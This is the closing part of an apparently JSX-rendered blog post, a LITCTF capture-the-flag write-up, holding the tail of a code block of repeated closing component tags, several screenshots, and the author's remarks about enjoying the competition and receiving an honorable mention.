class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180927711-2e2e79c4-0cfa-405b-9878-ba095ee61805.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180927801-55348145-b235-46f2-8f38-77a12d1bdf43.png"
        alt="image" />
    </p>
    <p>Really really creative challenge :D. ...</p>
    <blockquote>
      <p>&quot;So yeah, didn&#39;t solved all the challenges but LITCTF was really fun to play.&quot;</p>
    </blockquote>
    <h1 id="honorable-mention"><a href="#honorable-mention">Honorable Mention</a></h1>
    <p>Guess what, I got the HM lol xD, tks @CodeTiger#1869</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183063502-b8b51ca8-019a-46da-9955-8f3d649976d8.png"
        alt="image" />
    </p>
  </article>
</Post>
